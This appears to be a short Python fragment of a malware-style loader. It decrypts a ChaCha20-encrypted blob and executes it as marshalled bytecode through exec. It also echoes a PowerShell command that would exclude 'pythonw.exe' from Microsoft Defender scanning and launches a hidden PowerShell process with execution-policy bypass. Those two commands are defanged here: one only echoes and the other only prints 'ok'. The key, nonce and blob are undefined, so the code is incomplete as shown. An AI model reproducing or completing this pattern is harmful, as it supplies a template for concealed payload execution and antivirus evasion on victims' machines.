import marshal, subprocess
from Crypto.Cipher import ChaCha20
clear = ChaCha20.new(key=key, nonce=nonce).decrypt(blob)
exec(marshal.loads(clear))
subprocess.run(["echo", "Add-MpPreference -ExclusionProcess 'pythonw.exe'"])
subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "Write-Output 'ok'"], creationflags=0x08000000)
